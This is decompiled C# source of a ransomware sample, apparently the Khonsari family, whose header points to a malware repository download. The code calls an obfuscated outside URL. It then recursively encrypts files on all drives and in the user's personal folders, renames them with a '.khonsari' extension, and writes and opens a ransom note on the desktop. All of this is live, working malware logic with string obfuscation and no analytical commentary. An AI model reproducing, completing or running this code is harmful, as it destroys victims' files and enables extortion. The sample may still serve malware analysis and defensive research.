// Decompiled with JetBrains decompiler
// Type: SCVuZRaW
// Assembly: dorfler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17854846-16B6-4B16-9B03-D518D9EA03C7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;

internal static class SCVuZRaW
{
  private static readonly ivClqxOl FrfatcMQ = new ivClqxOl();
  private static readonly string HtqeFwaI = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + oymxyeRJ.CajLqoCk("\u0015\u0010=\u001Ce\u0015\0e\u000E\u001D&k\u001C\u000E\u001A\u0017i\u001E;\a\0\u0012o\a\b\u001B9e\u0011\u0019\u001B", "IXrKEAOE");
  private static readonly string rbTApefo = oymxyeRJ.CajLqoCk("\u0016\r\0\u0019v\b(\t*\u0011U\u00037\u0018$E-\a\u0010\u0005v\v/\u0006=\u001B\u0005\u001F3\na\u0004!\u0006U\u0018\"\u0001-\0!B\u0017\u0012v\u001A)\0o)\u001D\u00048\u001D \u0017&B\u0013\n;\a-\u001Cah<\rv\u0017.\u0010o\u0015\u001C\u0018>N5\no\u0006\u0010\b$\u00171\u0011oNU\b7\u0002-EgPG^\u007FNs]xODXfWa\n=B\u0010\u00067\a-E$\u0003\a\u000E8\u0005)\n!\u0011\u0014\u0019?.&\b.\v\u0019E5\u0001,KE+\u0013K/\u00014E+\rU\u00059\u001Aa\u000E!\r\u0002K>\u00016E;\rU\t#\u0017a\a;\u0001YK#\u001D$E.B\u0006\u000E7\u001C\"\ro\a\u001B\f?\0$E;\rU\r?\0%E*\u001A\u0016\u00037\0&\0<L\u007F/\u0019N\u000F*\u001BB8$\u0012'\a<o-'K\u0012+\r \u001B'U?\u001E'\u0012E\t+9.v!\u0013E\u000E,,K\u0013 \u00027\u00162!.\u0012N\a,\u0003'&Ev'\aE\u0016- K\u0012!mE\u0016- 9v(\b)\n1U&\u00177a'\nB %\u0004+\u0002*\u0019''*\u0014\"\u0004KE;\u001A\u001E$N\b!o\v\u0006Q", "ObukVnAe") + SCVuZRaW.FrfatcMQ.PruZnHLM;
  private const string jkuckbUP = ".khonsari";

  private static void Main()
  {
    List<string> stringList = new List<string>();
    new WebClient().DownloadString(oymxyeRJ.CajLqoCk("/\u001B\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001F!(\u001C>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007F\u0006;3", "GoaahQrC"));
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (!drive.Name.Equals(oymxyeRJ.CajLqoCk("2w\u0015", "qMIamfMA")))
        stringList.Add(drive.Name);
    }
    stringList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
    stringList.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
    stringList.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
    stringList.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), oymxyeRJ.CajLqoCk(")=&\u0004%%&#\u001E", "mRQjIJGG")));
    stringList.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
    foreach (string TRMxsUCM in stringList)
    {
      try
      {
        foreach (string str in SCVuZRaW.bXUaefgt(TRMxsUCM))
        {
          if (!SCVuZRaW.LxqQXinF(str))
          {
            try
            {
              System.IO.File.WriteAllBytes(str, SCVuZRaW.FrfatcMQ.rVWZTCXX(System.IO.File.ReadAllBytes(str)));
              System.IO.File.Move(str, str + oymxyeRJ.CajLqoCk("T)\u0004\f/4+3\u0013", "zBlcAGJA"));
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }
    System.IO.File.WriteAllText(SCVuZRaW.HtqeFwaI, SCVuZRaW.rbTApefo);
    Process.Start(SCVuZRaW.HtqeFwaI);
  }

  private static IEnumerable<string> bXUaefgt(string TRMxsUCM)
  {
    Queue<string> stringQueue = new Queue<string>();
    stringQueue.Enqueue(TRMxsUCM);
    while (stringQueue.Count > 0)
    {
      TRMxsUCM = stringQueue.Dequeue();
      try
      {
        foreach (string directory in Directory.GetDirectories(TRMxsUCM))
          stringQueue.Enqueue(directory);
      }
      catch
      {
      }
      string[] strArray = (string[]) null;
      try
      {
        strArray = Directory.GetFiles(TRMxsUCM);
      }
      catch
      {
      }
      if (strArray != null)
      {
        for (int index = 0; index < strArray.Length; ++index)
          yield return strArray[index];
      }
      strArray = (string[]) null;
    }
  }

  private static bool LxqQXinF(string YzmfzBzk) => YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk("\u007F\u001D\0\a\u000F\"\u000E%8", "QvhhaQoW")) || YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk("g\u001D/.", "ItAGEocK")) || YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk("\r\a2", "diYplLvh")) || YzmfzBzk.Equals(SCVuZRaW.HtqeFwaI);
}
